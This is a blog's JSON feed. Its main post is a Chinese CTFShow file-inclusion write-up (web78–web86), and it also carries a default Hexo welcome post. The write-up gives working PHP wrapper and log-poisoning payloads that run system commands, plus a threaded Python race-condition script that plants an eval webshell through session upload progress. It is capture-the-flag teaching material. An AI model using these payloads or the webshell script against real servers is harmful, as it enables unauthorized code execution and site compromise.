{
    "version": "https://jsonfeed.org/version/1",
    "title": "自由之翼",
    "subtitle": "",
    "icon": "https://zzk6th.github.io/assets/favicon.ico",
    "description": "你猜?",
    "home_page_url": "https://zzk6th.github.io",
    "items": [
        {
            "id": "https://zzk6th.github.io/CTF%20Show%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "url": "https://zzk6th.github.io/CTF%20Show%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "title": "CTF Show文件包含",
            "date_published": "2024-02-29T07:20:46.188Z",
            "content_html": "<h1 id=\"web78\"><a class=\"anchor\" href=\"#web78\">#</a> Web78</h1>\n<p>用 php 伪协议绕过</p>\n<blockquote>\n<p>?file=php://filter/convert.base64-encode/resource=flag.php</p>\n</blockquote>\n<h1 id=\"web79\"><a class=\"anchor\" href=\"#web79\">#</a> web79</h1>\n<p>用 date 伪协议绕过</p>\n<blockquote>\n<p>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=<br />\n?file=data://text/plain,&lt;?= system('tac flag.p*p');?&gt;</p>\n</blockquote>\n<p>或者用 input 大写 php 绕过</p>\n<blockquote>\n<p>?file=Php://input<br />\npost：&lt;?php system('ls');?&gt;</p>\n</blockquote>\n<h1 id=\"web80\"><a class=\"anchor\" href=\"#web80\">#</a> Web80</h1>\n<p>上题中 input 的 php 大写绕过 jie 还能用<br />\n<img data-src=\"%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_2.png\" alt=\"Image-1\" /><br />\nphp 和 data 伪协议都用不了了，可以包含日志文件<br />\n通过 Wappalyzer 得知中间件是 Nginx</p>\n<blockquote>\n<p>?file=/var/log/nginx/access.log<br />\nUser-Agent: &lt;?php echo 123;phpinfo();eval($_POST[0]);?&gt;</p>\n</blockquote>\n<p><em>直接连接蚁剑拿到 flag</em></p>\n<h1 id=\"web81\"><a class=\"anchor\" href=\"#web81\">#</a> web81</h1>\n<p>与上一题一样<br />\n传参</p>\n<blockquote>\n<p>?file=/var/log/nginx/access.log</p>\n</blockquote>\n<p>再改</p>\n<blockquote>\n<p>User-Agent: &lt;?php system('ls');?&gt;</p>\n</blockquote>\n<p>回车两次，得到</p>\n<blockquote>\n<p>fl0g.php index.php</p>\n</blockquote>\n<p>然后再改</p>\n<blockquote>\n<p>User-Agent: &lt;?php system('tac fl0g.p*p');?&gt;</p>\n</blockquote>\n<p>回车两次，得到最终 flag<br />\n<img data-src=\"CTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_3.png\" alt=\"Image-2\" /></p>\n<h1 id=\"web82~web86\"><a class=\"anchor\" href=\"#web82~web86\">#</a> Web82~Web86</h1>\n<pre><code>import requests\nimport io\nimport threading\n \n \nurl='http://b04c7980-d374-4c39-9ebc-a612708262c8.challenge.ctf.show/'\nsessionid='ctfshow'\ndata=&#123;\n&quot;1&quot;:&quot;file_put_contents('/var/www/html/muma.php','&lt;?php eval($_POST[a]);?&gt;');&quot;\n&#125; \n \n'''\npost 传递内容可在网站目录下写入一句话木马。\n根据资料，内容暂存在 /tmp/ 目录下 sess_sessionid 文件。\nsessionid 可控，所以这里即 /tmp/sess_ctfshow。\n这样一旦访问成功，就说明木马植入了\n'''\n \n \n# /tmp/sess_sessionid 中写入一句话木马。\ndef write(session): \nfileBytes = io.BytesIO(b'a'*1024*50)\nwhile True:\nresponse=session.post(\nurl,\ndata=&#123;\n'PHP_SESSION_UPLOAD_PROGRESS':'&lt;?php eval($_POST[1]);?&gt;'\n&#125;,\ncookies=&#123;\n'PHPSESSID':sessionid\n&#125;,\nfiles=&#123;\n'file':('ctfshow.jpg',fileBytes)\n&#125;\n)\n \n \n# 访问 /tmp/sess_sessionid，post 传递信息，保存新木马。\ndef read(session):\nwhile True:\nresponse=session.post(\nurl+'?file=/tmp/sess_'+sessionid,\n    data=data,\ncookies=&#123;\n'PHPSESSID':sessionid\n&#125;\n)\n# 访问木马文件，如果访问到了就代表竞争成功\nresposne2=session.get(url+'muma.php')\nif resposne2.status_code==200:\nprint('++++++done++++++')\nelse:\nprint(resposne2.status_code)\n \nif __name__ == '__main__':\n \nevnet=threading.Event()\n# 写入和访问分别设置 5 个线程。\nwith requests.session() as session:\nfor i in range(5):\nthreading.Thread(target=write,args=(session,)).start()\nfor i in range(5):\nthreading.Thread(target=read,args=(session,)).start()\n \nevnet.set()\n \n</code></pre>\n<p>运行脚本并成功写入后即可访问木马。<img data-src=\"%5Cassets%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_4.png\" alt=\"Image-3\" /><br />\n<img data-src=\"%5Cassets%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_5.png\" alt=\"Image-4\" /></p>\n<h1 id=\"web87未完待续\"><a class=\"anchor\" href=\"#web87未完待续\">#</a> Web87 (未完待续)</h1>\n",
            "tags": [
                "CTF"
            ]
        },
        {
            "id": "https://zzk6th.github.io/hello-world/",
            "url": "https://zzk6th.github.io/hello-world/",
            "title": "Hello World",
            "date_published": "2024-01-27T11:25:42.668Z",
            "content_html": "<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"quick-start\"><a class=\"anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo new <span class=\"token string\">\"My New Post\"</span></pre></td></tr></table></figure><p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"run-server\"><a class=\"anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo server</pre></td></tr></table></figure><p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"generate-static-files\"><a class=\"anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo generate</pre></td></tr></table></figure><p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo deploy</pre></td></tr></table></figure><p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n",
            "tags": []
        }
    ]
}